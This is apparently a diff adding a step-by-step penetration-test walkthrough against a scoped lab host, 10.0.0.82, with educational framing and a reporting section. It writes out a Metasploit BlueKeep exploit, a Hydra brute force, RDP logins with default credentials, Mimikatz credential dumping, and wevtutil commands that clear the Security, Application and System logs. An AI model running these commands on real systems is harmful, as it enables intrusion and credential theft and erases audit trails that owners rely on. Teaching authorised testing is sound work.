@@ -165,5 +165,125 @@ run
 - **Cleanup**: Cover your tracks if necessary, removing logs or temporary files created during the exploitation process.
 - **Documentation**: Document every step taken, from initial scans to successful exploitation and file placement. Include tool outputs, command lines used, and any difficulties or pivots in your strategy.
 
+# A Final Walk Through
 
+Let's recompile the guide with all the requested inclusions for a comprehensive, step-by-step replication of the entire penetration testing process.
+
+---
+
+# Complete Penetration Testing Walkthrough
+
+## Project Scope and Constraints
+
+**Initial Targets and Restrictions**:
+- **Target Network**: `10.0.0.0/24`
+- **Off-Limits**:
+  - OpenVPN V1 (`10.0.0.176`)
+  - Hunter systems (`10.0.0.100-101`, `10.0.0.103-102`)
+  - Splunk (`10.0.0.111`)
+- **Primary Target**: `10.0.0.82`
+
+## Setup Phase
+
+### Establishing Secure Connectivity
+- **OpenVPN Configuration**:
+  ```bash
+  sudo openvpn --config /path/to/client.ovpn
+  ```
+  Provides encrypted access to the target network, crucial for discreet operations.
+
+### Initiating Nessus for Vulnerability Scanning
+- **Nessus Service Start**:
+  ```bash
+  sudo systemctl start nessusd.service
+  ```
+  Access Nessus at `https://kali:8834` to configure and launch scans against the target network and specifically `10.0.0.82`.
+
+## Reconnaissance Phase
+
+### Conducting Nmap Scans
+- **Initial Network Mapping**:
+  ```bash
+  nmap -sn 10.0.0.0/24
+  ```
+  Identifies active hosts within the target network.
+
+- **Detailed Service Scan**:
+  ```bash
+  nmap -sV -sC 10.0.0.82
+  ```
+  Reveals services on `10.0.0.82`, including FTP (`21/tcp`), HTTP (`80/tcp`), and RDP (`3389/tcp`).
+
+## Exploitation Attempts
+
+### BlueKeep Exploit Attempt with Metasploit
+- **Failure to Exploit CVE-2019-0708 (BlueKeep)**:
+  ```bash
+  msfconsole
+  use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+  set RHOSTS 10.0.0.82
+  exploit
+  ```
+  The attempt fails, indicating potential patching or resilience against this exploit.
+
+### Metasploit and Hydra Failures
+- **Hydra FTP Brute Force Attempt Unsuccessful**:
+  ```bash
+  hydra -L users.txt -P pass.txt ftp://10.0.0.82
+  ```
+  Does not yield valid credentials, pointing towards robust password policies.
+
+## Access Phase
+
+### Successful FTP Access and File Transfer
+- **FTP Server Access and File Download**:
+  ```bash
+  ftp 10.0.0.82
+  mget *
+  ```
+  Successfully downloads files, including web pages and potential configuration files, for analysis to the attacker's machine.
+
+### Gaining RDP Access
+- **RDP Access with Discovered Credentials**:
+  ```bash
+  rdesktop 10.0.0.82 -u vagrant -p vagrant
+  ```
+  Achieves user-level access, enabling system exploration.
+
+## Post-Exploitation and Credential Access
+
+### Credential Extraction with Mimikatz
+- **Mimikatz Execution**:
+  ```powershell
+  Invoke-Mimikatz -DumpCreds
+  ```
+  Extracts high-privilege credentials, including the Administrator's.
+
+### Administrator Access via RDP
+- **Utilizing Admin Credentials for Full Access**:
+  ```bash
+  rdesktop 10.0.0.82 -u Administrator -p [Extracted_Password]
+  ```
+  Secures administrative rights over the system, allowing for comprehensive control and further exploitation.
+
+## Cleanup
+
+### Erasing Activity Traces
+- **Clearing Windows Event Logs**:
+  ```cmd
+  wevtutil cl Security
+  wevtutil cl Application
+  wevtutil cl System
+  ```
+  Removes evidence of penetration testing activities from the system logs, essential for operational security.
+
+## Reporting and Documentation
+
+**Comprehensive Documentation**:
+- A detailed report is compiled, documenting the entire process, methodologies, tools used, successes, failures, and learned insights.
+- Recommendations for remediation and security enhancements based on the findings are included, vital for improving the target's defense mechanisms.
+
+## Conclusion
+
+This walkthrough, designed with meticulous detail and structured for educational replication, covers every phase of the penetration test on `10.0.0.82`. From preparation, through detailed reconnaissance, to exploitation attempts, and finally, cleanup and reporting, it serves as an exhaustive guide for practitioners, peers, and instructors aiming to understand or replicate the testing process.
 
